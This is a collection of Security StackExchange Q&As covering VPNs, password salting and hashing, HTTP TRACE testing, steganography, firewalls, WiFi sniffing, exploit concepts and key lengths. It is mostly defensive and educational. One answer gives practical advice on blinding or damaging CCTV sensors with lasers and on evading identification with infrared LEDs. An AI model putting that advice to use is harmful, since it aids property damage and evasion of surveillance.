<p>Succinctly, for access to Gmail specifically, the App uses the password upon the first connection, to obtain a specific token value; think of it as a randomly generated sub-password. The token value is enough to read incoming emails, send emails, and alter the mailbox. It does not, however, give any power beyond these operations, so knowing the token value does not give you access to the actual password or to other Google sites (like Google+). The App stores the token value, not the user password.</p>

<p>So this answers your question: if someone steals or subverts your smartphone, he can obtain the token value which grants access to your emails, but he won't be able to recover or reset your password, or access any other service linked with your password. Of course, a few caveats apply:</p>

<ul>
<li><p>Someone who controls your emails can then leverage that to attack all systems who use an email-based password-recovery system. A lot of sites implement a ""forgotten password"" feature in which a password-reset token (say, URL) is sent through email. Gaining access to your emails is kind of equivalent to stealing your Internet life altogether.</p></li>
<li><p>An attacker who could subvert your phone enough to read the private data storage of the Gmail App is most probably able to plant a key/screen logger and obtain your actual password the next time you type it.</p></li>
</ul>
","38477"
"How does Google Maps know where I am, when I'm using a VPN?","99685","","<p>How does Google Maps determine my location?</p>

<p>I've gotten some understanding of Google Maps' geolocation methods from here:
<a href=""http://friendlybit.com/js/geolocation-and-google-maps/"">http://friendlybit.com/js/geolocation-and-google-maps/</a></p>

<blockquote>
  <p>In the newer browsers (all but IE6, IE7, or IE8) may ask you for your
  positioning information from the browser. It usually shows up as a bar
  at the top of the browser. The browser then gathers two specific forms
  of positioning information from your computer: your IP address and the
  signal strength of any wireless network near you. That information is
  then sent, if you approve it, to Google, which returns the coordinates
  you are at the moment.</p>
  
  <p>[...]</p>
  
  <p>If your wireless reciever is turned off, or you’re at a stationary
  computer, all calculations are based on the IP number. These kind of
  lookups are quite arbitrary and inaccurate, I just get to the nearest
  big city when trying to use it over a non-wireless line. But mobile
  connections are slowly taking over landlines, so I guess this problem
  will solve itself automatically.</p>
</blockquote>

<p>According to this article, Google only uses my IP address if I am using a desktop.  However, when I use a VPN to go online (and I can confirm that another IP geolocation service shows me as being on another continent), Google Maps is still able to accurately show my location.  How does this work?</p>
","<blockquote>
  <p>If you consent, <strong>Firefox gathers information</strong> about nearby wireless access points and <strong>your computer’s IP address</strong>. Then Firefox sends this information to the default geolocation service provider...</p>
</blockquote>

<p><a href=""https://www.mozilla.org/en-US/firefox/geolocation/"">https://www.mozilla.org/en-US/firefox/geolocation/</a></p>

<p>Firefox knows the IP address, which is used to connect to the VPN provider. Many geolocation services, however, only look at the IP address they see from the server side.</p>

<p>By the way: With java installed, a website can read the local ip-address without asking for permission.</p>

<pre><code>new Socket(""http://example.com"", 80)).getLocalAddress().getHostAddress()
</code></pre>

<p>example.com needs to be replaced with the name website to obey the same origin policy.</p>
","16310"
"Connect through two VPN clients","98620","","<p>What exactly happens if I connect through two VPN clients on my laptop? For example, I connect using Cisco Any Connect, and then use another VPN client (such as HotSpot Shield or proXPN) to connect through another tunnel.</p>

<p>Will the actual data be decrypted at the first server/site and be in plaintext/visible? I mean, will this happen: data is encrypted at my laptop, sent to server 1, decrypted, then encrypted, sent to server 2 where it's finally decrypted. I doubt it, because the second tunnel is through <em>my client to server 2</em>, not <em>server 1 to server 2</em>.</p>

<p>Or will it be a tunnel in a tunnel? So: data is encrypted and encapsulated twice at my laptop, decrypted at server 1, but is not yet in plaintext, and would be routed to server 2 where it'll be finally decrypted.</p>

<p>Or will the laptop simply pick one tunnel (the latter?) for a normal client-to-site VPN? Or will the second connected not even establish in the first place?</p>
","<p><strong>A typical VPN client</strong> works like this: it connects to the server, and then it instructs the operating system to give him all packets which are to be sent to any address in a given set. For instance, let's assume that the VPN client advertises that it should handle all packets meant for 10.0.0.0/8 (i.e. all IP addresses which start with ""10""). When the OS sees a packet which should go to address ""u.v.w.x"", it checks whether ""u"" is ""10""; if yes, then it gives the packet to the VPN, which does its magic with it and forwards it, under heavy encryption/MAC/whatever to the server; otherwise, the packet is emitted ""to the Internet"" as the OS would have done without the VPN client.</p>

<p>Details on how this system is implemented depend on the VPN implementation (e.g. it may declare specific ""routes""; or it could intercept all outgoing packets with firewalling rules and redirect the packets it is interested in;...).</p>

<p>If you have two VPN clients and their ""advertised sets of addresses"" do not overlap, then chances are that they will live together nicely <em>at the IP level</em>: each will grab the packets for its own virtual network, leaving the other packets untouched. However, they might also fight for the ""interception resources"" which may result in the first VPN client to be wholly deactivated.</p>

<p>On the other hand, if both VPN advertise overlapping sets of addresses, then trouble is pretty much guaranteed. If you are lucky, the second VPN will refuse to run with an explicit message. Otherwise, one of the clients may take precedence, possibly intermittently, and things will be weird and confusing. Possibly, one VPN server will receive the packets which were due for the <em>other</em> VPN, thus incurring a severe data leak.</p>

<p><strong>There will be trouble with DNS</strong>. Applications and humans do not want to deal with <em>IP addresses</em> but with <em>host names</em>. The DNS converts host names to IP addresses. A VPN being a ""virtual <em>private</em> network"", it uses names which are not visible to the worldwide, Internet DNS. Therefore, a VPN client will not only intercept IP packets, but also the name resolution system, and redirect some (if not all) of name resolution requests to a dedicated DNS server on the VPN.</p>

<p>Your two VPN clients will compete for that redirection. Things <em>might</em> just work well if the clients manage to redirect requests for just some domains. But chances are that hijinks will ensue. Some names for one VPN will probably cease to be convertible to IP addresses, resulting in reduced functionality. Possibly, one VPN will receive name resolutions for the <em>other</em> VPN, so not only is the functionality broken (because the DNS in one VPN will not know what to do with names from the other VPN) but some private data leaks from one VPN to another (host <em>names</em> are rarely very sensitive, but that's still a leakage).</p>

<p>In this last situation, the VPN which receives name resolution requests for private names of the other VPN is in ideal position to respond with forged DNS answers and redirect all traffic from the other VPN to itself.</p>

<p><strong>So don't do that</strong>. Running several VPN clients concurrently is a source of trouble, hard-to-diagnose failures and potential data leaks.</p>

<hr />

<p><strong>To avoid issues with multiple VPN</strong>, you should endeavour to use more ""controlled"" forms of VPN. For instance, a <em>SOCKS proxy with ssh</em>. This would allow you to run one Web browser which redirect all its traffic to another host (the ""VPN server"") while leaving the rest of the machine (and, crucially, other browser instances) unaltered. See <a href=""https://security.stackexchange.com/questions/23561/authenticating-a-proxy-server-over-https/23584#23584"">this answer</a> for instance. Some purists say that such proxying is <em>not</em> a VPN, but for many practical purposes (anything which is Web-based, really), this is functionally equivalent. See also the alternative with port-based tunnels.</p>

<p>I used to do that a lot at one time (a dozen or so port-based tunnels, and also SOCKS proxying, and it was all working well). The SOCKS solution works well for name resolution too: the name resolutions requests from the Web browser will go through the tunnel, to be resolved on the other side (i.e. in the VPN), without touching the local DNS configuration. Port-based tunnels require a static local name declaration.</p>
","31036"
"How to store salt?","96379","","<p>Nowadays, if we expect to store user password securely, we need at least do the following thing:</p>

<pre><code>$pwd=hash(hash($password) + salt)
</code></pre>

<p>then store <code>$pwd</code> in your system instead of the real password. I have seen some cases where <code>$pwd</code> contains the <code>salt</code> itself.</p>

<p>So, the question is, how to store the salt, should it be stored separately or is it OK if an attacker gets the hashed value and the salt the same time, and why?</p>
","<p><strong>TL;DR - You can store the salt in plaintext without any form of obfuscation or encryption, but don't just give it out to anyone who wants it.</strong></p>

<hr>

<p>The reason we use salts is to stop precomputation attacks, such as <a href=""http://en.wikipedia.org/wiki/Rainbow_table"" rel=""noreferrer"">rainbow tables</a>. These attacks involve creating a database of hashes and their plaintexts, so that hashes can be searched for and immediately reversed into plaintext.</p>

<p>For example*:<br /></p>

<pre><code>86f7e437faa5a7fce15d1ddcb9eaeaea377667b8 a
e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98 b
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4 c
...
948291f2d6da8e32b007d5270a0a5d094a455a02 ZZZZZX
151bfc7ba4995bfa22c723ebe7921b6ddc6961bc ZZZZZY
18f30f1ba4c62e2b460e693306b39a0de27d747c ZZZZZZ
</code></pre>

<p>Most tables also include a list of common passwords:</p>

<pre><code>5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 password
e38ad214943daad1d64c102faec29de4afe9da3d password1
b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 letmein
5cec175b165e3d5e62c9e13ce848ef6feac81bff qwerty123
</code></pre>

<p><sup>*I'm using SHA1 here as an example, but I'll explain why this is a bad idea later.</sup></p>

<p>So, if my password hash is <code>9272d183efd235a6803f595e19616c348c275055</code>, it would be exceedingly easy to search for it in a database and find out that the plaintext is <code>bacon4</code>. So, instead of spending a few hours cracking the hash (ok, in this case it'd be a few minutes on a decent <a href=""http://en.wikipedia.org/wiki/Graphics_processing_unit"" rel=""noreferrer"">GPU</a>, but we'll talk about this later) you get the result instantly.</p>

<p>Obviously this is bad for security! So, we use a salt. A salt is a random unique token stored with each password. Let's say the salt is <code>5aP3v*4!1bN&lt;x4i&amp;3</code> and the hash is <code>9537340ced96de413e8534b542f38089c65edff3</code>. Now your database of passwords is useless, because nobody has rainbow tables that include that hash. It's computationally infeasible to generate rainbow tables for every possible salt.</p>

<p>So now we've forced the bad guys to start cracking the hashes again. In this case, it'd be pretty easy to crack since I used a bad password, but it's still better than him being able to look it up in a tenth of a second!</p>

<p>Now, since the goal of the salt is <em>only</em> to prevent pre-generated databases from being created, it doesn't need to be encrypted or obscured in the database. You can store it in plaintext. The goal is to force the attacker to have to crack the hashes once he gets the database, instead of being able to just look them all up in a rainbow table.</p>

<p>However, there is one caveat. If the attacker can quietly access a salt <em>before</em> breaking into your database, e.g. through some script that offers the salt to anyone who asks for it, he can produce a rainbow table for that salt as easily as he could if there wasn't one. This means that he could silently take your admin account's salt and produce a nice big rainbow table, then hack into your database and immediately log in as an admin. This gives you no time to spot that a breach has occurred, and no time to take action to prevent damage, e.g. change the admin password / lock privileged accounts. This doesn't mean you should obscure your salts or attempt to encrypt them, it just means you should design your system such that the only way they can get at the salts is by breaking into the database.</p>

<p>One other idea to consider is a <a href=""https://security.stackexchange.com/questions/3272/password-hashing-add-salt-pepper-or-is-salt-enough"">pepper</a>. A pepper is a second salt which is constant between individual passwords, but not stored in the database. We might implement it as <code>H(salt + password + pepper)</code>, or <code>KDF(password + pepper, salt)</code> for a key-derivation function - we'll talk about those later. Such a value might be stored in the code. This means that the attacker has to have access to both the database and the sourcecode in order to attempt to crack the hashes. This idea should only be used to <em>supplement</em> other security measures. A pepper is useful when you're worried about SQL injection attacks, where the attacker only has access to the database, but this model is (slowly) becoming less common as people move to <a href=""https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28Parameterized_Queries.29"" rel=""noreferrer"">parameterized queries</a>. You <em>are</em> using parameterized queries, right? Some argue that a pepper constitutes security through obscurity, since you're only obscuring the pepper, which is somewhat true, but it's not to say that the idea is without merit.</p>

<p>Now we're at a situation where the attacker can brute-force each individual password hash, but can no longer search for all the hashes in a rainbow table and recover plaintext passwords immediately. So, how do we prevent brute-force attacks now?</p>

<p>Modern graphics cards include GPUs with hundreds of cores. Each core is very good at mathematics, but not very good at decision making. It can perform billions of calculations per second, but it's pretty awful at doing operations that require complex branching. Cryptographic hash algorithms fit into the first type of computation. As such, frameworks such as <a href=""http://en.wikipedia.org/wiki/OpenCL"" rel=""noreferrer"">OpenCL</a> and <a href=""http://en.wikipedia.org/wiki/CUDA"" rel=""noreferrer"">CUDA</a> can be leveraged in order to massively accelerate the operation of hash algorithms. Run <a href=""http://hashcat.net/oclhashcat-lite/"" rel=""noreferrer"">oclHashcat</a> with a decent graphics card and you can compute an excess of 10,000,000,000 MD5 hashes per second. SHA1 isn't much slower, either. There are people out there with dedicated GPU cracking rigs containing 6 or more top-end graphics cards, resulting in a cracking rate of over 50 billion hashes per second for MD5. Let me put that in context: such a system can brute force an 8 character alphanumeric password in <em>less than 4 minutes</em>.</p>

<p>Clearly hashes like MD5 and SHA1 are way too fast for this kind of situation. One approach to this is to perform thousands of iterations of a cryptographic hash algorithm:</p>

<pre><code>hash = H(H(H(H(H(H(H(H(H(H(H(H(H(H(H(...H(password + salt) + salt) + salt) ... )
</code></pre>

<p>This slows down the hash computation, but isn't perfect. Some advocate using <a href=""http://en.wikipedia.org/wiki/SHA-2"" rel=""noreferrer"">SHA-2</a> family hashes, but this doesn't provide much extra security. A more solid approach is to use a key derivation function with a work factor. These functions take a password, a salt and a work factor. The work factor is a way to scale the speed of the algorithm against your hardware and security requirements:</p>

<pre><code>hash = KDF(password, salt, workFactor)
</code></pre>

<p>The two most popular KDFs are <a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a> and <a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a>. PBKDF2 works by performing iterations of a keyed <a href=""http://en.wikipedia.org/wiki/HMAC"" rel=""noreferrer"">HMAC</a> (though it can use block ciphers) and bcrypt works by computing and combining a large number of ciphertext blocks from the <a href=""http://en.wikipedia.org/wiki/Blowfish_%28cipher%29"" rel=""noreferrer"">Blowfish</a> block cipher. Both do roughly the same job. A newer variant of bcrypt called <a href=""http://www.tarsnap.com/scrypt.html"" rel=""noreferrer"">scrypt</a> works on the same principle, but introduces a memory-hard operation that makes cracking on GPUs and <a href=""http://en.wikipedia.org/wiki/Field-programmable_gate_array"" rel=""noreferrer"">FPGA</a>-farms completely infeasible, due to memory bandwidth restrictions.</p>

<hr>

<p><strong>Update:</strong> As of January 2017, the state-of-the-art hashing algorithm of choice is <a href=""https://github.com/P-H-C/phc-winner-argon2"" rel=""noreferrer"">Argon2</a>, which won the Password Hashing Competition.</p>

<hr>

<p>Hopefully this gives you a nice overview of the problems we face when storing passwords, and answers your question about salt storage. I highly recommend checking out the ""links of interest"" at the bottom of <a href=""https://security.stackexchange.com/a/17422/2113"">Jacco's answer</a> for further reading, as well as these links:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/549/the-definitive-guide-to-forms-based-website-authentication"">The Definitive Guide to Forms-Based Website Authentication</a></li>
<li><a href=""https://www.owasp.org/index.php/Main_Page"" rel=""noreferrer"">The Open Web Application Security Project (OWASP)</a></li>
<li><a href=""https://stackoverflow.com/questions/1645161/salt-generation-and-open-source-software/1645190#1645190"">Similar answer on StackOverflow</a></li>
</ul>
","17435"
"Testing for HTTP TRACE method","95309","","<p><strong>How can I test for HTTP TRACE on my web-server?</strong></p>

<p>I need to train a Tester how to verify that the HTTP TRACE method is disabled.</p>

<p>Ideally I need a script to paste into Firebug to initiate a https connection to return the web server response to a HTTP TRACE command.</p>

<p><strong>Background:</strong></p>

<p>Our security Pen Testers identified a HTTP TRACE vulerability and we need to prove that it is fixed.</p>

<p><strong>References:</strong></p>

<ul>
<li><a href=""https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29"">OWASP on XST</a></li>
<li><a href=""http://www.apacheweek.com/issues/03-01-24#news"">Apache Week</a></li>
</ul>
","<p>Simplest way I can think of is using <a href=""http://curl.haxx.se/"">cURL</a> (which is scriptable).</p>

<pre><code> curl -v -X TRACE http://www.yourserver.com
</code></pre>

<p>Running it against an Apache server with <code>TraceEnable Off</code> correctly returns <code>HTTP/1.1 405 Method Not Allowed</code> (just tested on an Apache 2.2.22)</p>

<p>This also works on HTTPS sites, provided that cURL has the correct information supplied to the SSL layer. This is the lazy man's check of Google</p>

<pre><code>curl --insecure -v -X TRACE https://www.google.com/
</code></pre>

<p>...it negotiates the connection (does not verify the certificate chain, but that's not the issue here since we want to check on <code>TRACE</code> status), and responds 405:</p>

<pre><code>* Server certificate:
*        subject: C=US; ST=California; L=Mountain View; O=Google Inc; CN=www.google.com
*        start date: 2013-02-20 13:34:56 GMT
*        expire date: 2013-06-07 19:43:27 GMT
*        subjectAltName: www.google.com matched
*        issuer: C=US; O=Google Inc; CN=Google Internet Authority
*        SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
&gt; TRACE / HTTP/1.1
&gt; User-Agent: curl/7.25.0 (x86_64-suse-linux-gnu) libcurl/7.25.0 OpenSSL/1.0.1c zlib/1.2.7 libidn/1.25 libssh2/1.4.0
&gt; Host: www.google.com
&gt; Accept: */*

&lt; HTTP/1.1 405 Method Not Allowed
</code></pre>
","31674"
"Detecting Steganography in images","92938","","<p>I recently came across an odd JPEG file: Resolution 400x600 and a filesize of 2.9 MB. I got suspicious and suspected that there is some additional information hidden. I tried some straight forward things: open the file with some archive tools; tried to read its content with an editor, but I couldn't locate anything interresting.</p>

<p>Now my questions: What else can I do? Are there any tools available that analyze images for hidden data? Perhaps a tool that scans for known file headers?</p>
","<p>To detect Steganography it really comes down to statistical analysis (not a subject I know very well).<br>
But here are a few pages that may help you out.</p>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/Steganography#Countermeasures_and_detection"">Steganography Countermeasures and detection</a> - Wikipedia page worth a read to cover the basics. </li>
<li><a href=""http://www.garykessler.net/library/fsc_stego.html"">An Overview of Steganography for the Computer Forensics Examiner</a> - Has quite a long list of tools and some other useful information.</li>
<li><a href=""http://www.uri.edu/personal2/imarcus/stegdetect.htm"">Steganography Detection</a> - Some more information about Stegonography. </li>
<li><a href=""http://www.outguess.org/detection.php"">Steganography Detection with Stegdetect</a> - Stegdetect is an automated tool for detecting steganographic content in images. It is capable of detecting several different steganographic methods to embed hidden information in JPEG images. Tool hasn't been updated in quite a while but it was the best looking free tool I could find with a quick search. </li>
</ul>
","2145"
"Why not use larger cipher keys?","92810","","<p><a href=""http://en.wikipedia.org/wiki/Key_size"">RSA Security commonly uses keys of sizes 1024-bit, 2048-bit or even 3072-bit.  And most Symmetric algorithms only between 112-bit and 256-bit.</a>  I do realize that the current keys are secure enough for today's hardware, but as computers get faster, should we not consider an insanely large key size like a million bits or so to protect ourselves against super computer systems that has not been invented yet?</p>

<p>So in other words what is the consequences of choosing a cipher key that is too large and why does everyone restrict their key sizes?</p>
","<p>The reason why RSA keys are so small is that:</p>

<blockquote>
  <p>With every doubling of the RSA key length, decryption is 6-7 times times slower.</p>
</blockquote>

<p>So this is just another of the security-convenience tradeoffs.
Here's a graph:
<img src=""https://i.stack.imgur.com/1x17e.png"" alt=""RSA Decryption time by key length""></p>

<p>Source: <a href=""http://www.javamex.com/tutorials/cryptography/rsa_key_length.shtml"" rel=""noreferrer"">http://www.javamex.com/tutorials/cryptography/rsa_key_length.shtml</a></p>
","25377"
"Disabling/Destroying CCTV/IP Cameras with Lasers?","92061","","<p>@D3C4FF has asked a great <a href=""https://security.stackexchange.com/questions/37686/is-there-any-way-to-tell-if-cctv-is-on-or-not"">question</a> and I would like to follow up on that. Basically he had asked whether ""[...] <em>an attacker can identify if a CCTV camera is on/operational without direct physical access to the cable/camera</em>[.]"".</p>

<p>I was highly impressed by @TildalWave 's <a href=""https://security.stackexchange.com/questions/37686/is-there-any-way-to-tell-if-cctv-is-on-or-not#37687"">answer</a>, and particularly about disabling cameras: ""[...] <em>all you need is a decent pocket/torch size green laser (532 nm) directed for a few seconds directly into their CCD/CMOS sensor.</em>"". </p>

<p>I remember some 10 years ago kids in my neighborhood had found out that you could 'DoS' the street lights using the same technique (by pointing the laser to a point near the back of the light bulb). I figured out that this was because those posts light automatically when it gets dark (meaning lack of light) and as soon as it gets bright (meaning light went inside its sensors) the light would turn off. </p>

<p>So I would like to ask: </p>

<p>1 - How does this laser attack apply to cameras?</p>

<p>2 - For which types of cameras does the laser pen attack work against (CCTV Vs. IP)? </p>

<p>3 - Is the laser pen attack the only vector against those devices (apart from obvious things like fire, TNT, acid, shooting, etc)? </p>

<p>4 - Why are cameras still vulnerable to it, if at all?</p>

<p>5 - Finally, how can I prevent those type of attacks against my cameras (they are all IP-based)?</p>

<hr>

<p>Just a quick edit for those who (like me) was not sure whether this question was appropriate for the site, <a href=""https://security.meta.stackexchange.com/questions/1314/following-up-a-question"">I have posted a question on Meta</a>. </p>
","<p>I've experimented with this attack previously. </p>

<p>It depends on a few variables. First, the strength in mW of the laser you are using. Second the quality of the camera you are trying to disable. </p>

<p><strong>1 - How does this laser attack apply to cameras?</strong></p>

<ul>
<li>A laser creates a super bright and focused spot on the CCD (camera sensor). This spot can be bright enough to blind the camera, or strong enough to physically damage the CCD/CMOS sensor of the camera (melting, overloading the circuitry etc). This is the type of image you'll see when a lazer is pointed at your camera: <img src=""https://i.stack.imgur.com/5Sr5d.jpg"" alt=""Sourced from linked site below""></li>
</ul>

<p><strong>2 - For which types of cameras does the laser pen attack work against (CCTV Vs. IP)?</strong></p>

<ul>
<li>It doesn't matter. It will work on ALL visible light imaging technologies. This includes film cameras, CCD, CMOS sensors etc. I've tested this with 'prosumer' point and shoot cameras and a wide variety of CCTV cameras. Being IP/CCTV doesn't change the fact that your overloading the light sensing components of the imaging sensor.</li>
</ul>

<p><strong>3 - Is the laser pen attack the only vector against those devices (apart from obvious things like fire, TNT, acid, shooting, etc)?</strong></p>

<ul>
<li>NO! Another clever one that i've used to success is wearable Infrared LED clothes (usually on a hat). This is essentially the same as using a bright light to obscure you from view, you will show up on the screen, but if you use bright enough LED's, it'll make you un-identifiable.</li>
</ul>

<p><strong>4 - Why are cameras still vulnerable to it, if at all?</strong></p>

<ul>
<li>Because cameras sense light, if you throw enough light at them, they won't be able to process the weaker reflected ambient light.</li>
</ul>

<p><strong>5 - Finally, how can I prevent those type of attacks against my cameras (they are all IP-based)?</strong></p>

<ul>
<li>You can't really. Its part of the design of the cameras. The best thing to do would be to identify cameras that may be vulnerable and perhaps install hidden cameras in the area so that if someone disables an overt camera, they'll hopefully miss the covert one.</li>
</ul>

<p>For more information on this type of attack, <a href=""http://www.naimark.net/projects/zap/howto.html"" rel=""noreferrer"">check this guy's site</a>, there have been a few projects like this around but this is well written up and contains lots of good example shots.</p>
","37698"
"Why block outgoing network traffic with a firewall?","91221","","<p>In terms of a home network, is there any reason to set up a router firewall so that all outgoing ports are blocked, and then open specific ports for things such as HTTP, HTTPS, etc. Given that every computer on the network is trusted, surely the amount of extra security provided by blocking outgoing ports would be pretty much negligible? </p>
","<p>Blocking outbound traffic is usually of benefit in limiting what an attacker can do once they've compromised a system on your network.</p>

<p>So for example if they've managed to get malware onto a system (via an infected e-mail or browser page), the malware might try to ""call home"" to a command and control system on the Internet to get additional code downloaded or to accept tasks from a control system (e.g. sending spam)</p>

<p>Blocking outbound traffic can help stop this from happening, so it's not so much stopping you getting infected as making it less bad when it's happened.</p>

<p>Could be overkill for a home network tho' as there's a lot of programs which make connections outbound and you'd need to spend a bit of time setting up all the exceptions.</p>
","24313"
"How to know what others browse through the network?","90774","","<p>My friend connected to WIFI and after 5 minutes he told me which sites I had actually been browsing, and who I chat with. </p>

<p>My question is: how do I defend myself against this, and also how did he do this? </p>
","<p>In a WiFi network, all information which is sent over the network is broadcasted over the air. Usually network interfaces are configured to just ignore any network traffic not addressed to them, but there are tools available which change them to ""promiscuous mode"" which allows them to also log and show any traffic which they receive even though it is directed at other network participants. Although WiFi networks are usually encrypted nowadays, the key is shared between all participants, so any network participant can eavesdrop on the traffic of everyone else. </p>

<p>The only defense against this is end-to-end encryption.</p>

<p>For casual webbrowsing, you should try to always use the <code>https://</code> version of a website. That way a sniffer on your WiFi network will only learn the domain you browse, but not which specific URL, what you read there and what you send there. When someone would eavesdrop on you right now, they would learn that you made a TLS handshake with <code>https://security.stackexchange.com</code> but not that the exact URL you view is <code>https://security.stackexchange.com/questions/74471/how-to-know-what-other-browse-through-the-network/</code> and what you are currently reading here. Should you choose to comment on this, that outgoing message would also be encrypted. I recommend the browser extension <a href=""https://www.eff.org/https-everywhere"">HTTPS Everywhere</a> which makes your webbrowser prefer https over http whenever possible.</p>

<p>Regarding chatting: Many chat systems do not offer encryption. When you are security-conscious, you should refuse to use these. There are too many chat systems available to list them all here, but the Electronic Frontier Foundation has a good <a href=""https://www.eff.org/secure-messaging-scorecard"">comparison of the security features of many chat systems</a>.</p>

<p>However, when you have a high security need, the best way to protect yourself on a public WiFi network without having to change most of your habits is to pay for a VPN service. With a VPN service, all your internet activity is routed through an encrypted channel to a server on the internet which then works as a proxy. As long as you trust your VPN provider, this allows you to do confidential internet activity from an untrusted network. The greatest advantage is that this works for <em>any</em> network traffic, so it does not matter if the software you use encrypts or not. However, keep in mind that the connection is only secured between you and the VPN provider. This 1. means that your VPN provider could eavesdrop and 2. that the connection between the VPN provider and your destination is unsecured.</p>
","74472"
"How to inject executable, malicious code into PDF, JPEG, MP3, etc.?","90499","","<ol>
<li><p>I wanted to know if its generally possible to inject executable code into files like PDFs or JPEGs etc., or must there be some kind of security hole in the application?</p></li>
<li><p>And if so, how would one do that?</p></li>
</ol>

<p>I often hear that people get infected by opening PDFs that contain malicious code, that's why I ask.</p>
","<p>There must be some security hole in the application.</p>

<p>Think like any very-simple-and-common .txt file: if you open it with an hex viewer, or with a well-designed textpad editor, it should only display the file content, and ok.</p>

<p>Then think about of processing the file, somehow, instead of just showing the contents. For example, reading the file and interpreting it's values. If it isn't done correctly, this could lead to execution of the bytes that are inside the file.</p>

<p>For example: if you have designed your app to load the whole file and show it, but somehow you have a variable inside your program that only holds 256 bytes. This could make you read (and write to memory) more bytes than your app expected. And, imagine, inside your app there would be any command to <em>jump to position NNNN in memory and execute what is there</em>, but since that memory position was written with data your program didn't expect, then you'll execute some code that shouldn't be there, and was loaded from your file...</p>

<p>That was a <strong>buffer overflow</strong> attack.</p>

<p>The same could happen with pdf, jpg, mp3, etc, if the app didn't load the data correctly.</p>

<p>Another possibility: for any other reason, the app (or some DLL it loads to read your data) executes some part of the data, instead of reading it. If you know what would be the command (or the data) that would trigger this behavior, you put those commands inside the data file (like the pdf file) so that the app executes it.</p>

<p><strong>PDF virus</strong>: read this site: <a href=""http://lwn.net/2001/0809/a/adobe-pdf-vul.php3"" rel=""noreferrer"">http://lwn.net/2001/0809/a/adobe-pdf-vul.php3</a> to know a bit about one virus that spread using PDF files.</p>
","8115"
"Is it possible to brute force all 8 character passwords in an offline attack?","89843","","<p><a href=""http://arstechnica.com/security/2013/10/how-the-bible-and-youtube-are-fueling-the-next-frontier-of-password-cracking/"">This article</a> states:</p>

<blockquote>
  <p>Brute-force techniques trying every possible combination of letters, numbers, and special characters had also succeeded at cracking all passwords of eight or fewer characters.</p>
</blockquote>

<p>There are 6.63 quadrillion possible 8 character passwords that could be generated using the 94 numbers, letters, and symbols that can be typed on my keyboard.  I'm skeptical that that many password combinations could actually be tested.  Is it really possible to test that many possibilities in a less than a year in this day and age?</p>
","<p>As per this <a href=""http://www.lockdown.co.uk/?pg=combi&amp;s=articles"">link</a>, with speed of 1,000,000,000 Passwords/sec, cracking a 8 character password composed using 96 characters takes 83.5 days. But a recent <a href=""http://arstechnica.com/security/2012/12/25-gpu-cluster-cracks-every-standard-windows-password-in-6-hours/"">research</a> presented at Password^12 in Norway, shows that 8 character passwords are no more safe. They can be cracked in 6 hours. </p>

<p>But one important thing to consider is which algorithm is used to create these hashes (assuming you are talking about hashed passwords). If some computationally intensive algorithm is used, then the rate of password cracking can be reduced significantly. In the link above, author highlights that ""the new cluster, even with its four-fold increase in speed, can make only 71,000 guesses against Bcrypt and 364,000 guesses against SHA512crypt."" </p>
","43684"
"Advantages and disadvantages of Stream versus Block Ciphers","89249","","<p>Encryption algorithms such as Blowfish,AES,RC4,DES and Seal are implemented in one of two categories of ciphers. What are the advantages/disadvantages to the type of ciphers?</p>
","<p>While both are symmetric ciphers, stream ciphers are based on generating an ""infinite"" cryptograpic keystream, and using that to encrypt one bit or byte at a time (similar to the one-time pad), whereas block ciphers work on larger chunks of data (i.e. blocks) at a time, often combining blocks for additional security (e.g. AES in CBC mode).  </p>

<ul>
<li>Stream ciphers are typically faster than block, but that has it's own price.  </li>
<li>Block ciphers typically require more memory, since they work on larger chunks of data and often have ""carry over"" from previous blocks, whereas since stream ciphers work on only a few bits at a time they have relatively low memory requirements (and therefore cheaper to implement in limited scenarios such as embedded devices, firmware, and esp. hardware).</li>
<li>Stream ciphers are more difficult to implement correctly, and prone to weaknesses based on usage - since the principles are similar to one-time pad, the keystream has very strict requirements. On the other hand, that's usually the tricky part, and can be offloaded to e.g. an external box.  </li>
<li>Because block ciphers encrypt a whole block at a time (and furthermore have ""feedback"" modes which are most recommended), they are more susceptible to noise in transmission, that is if you mess up one part of the data, all the rest is probably unrecoverable. Whereas with stream ciphers bytes are individually encrypted with no connection to other chunks of data (in most ciphers/modes), and often have support for interruptions on the line.  </li>
<li>Also, stream ciphers do not provide integrity protection or authentication, whereas some block ciphers (depending on mode) can provide integrity protection, in addition to confidentiality.</li>
<li>Because of all the above, stream ciphers are usually best for cases where the amount of data is either unknown, or continuous - such as network streams. Block ciphers, on the other hand, or more useful when the amount of data is pre-known - such as a file, data fields, or request/response protocols, such as HTTP where the length of the total message is known already at the beginning. </li>
</ul>
","345"
"How to estimate the time needed to crack RSA encryption?","89208","","<p>How to estimate the time needed to crack RSA encryption? I mean the time needed to crack Rsa encryption with key length of 1024, 2048, 3072, 4096, 5120, 6144, 5120, 7168, 8192, 9216, 10240, 11264, 12288, 13312, 14336, 15360, and 16384?</p>
","<p>See <a href=""http://www.keylength.com/"">this site</a> for a summary of the key strength estimates used by various researchers and organizations.</p>

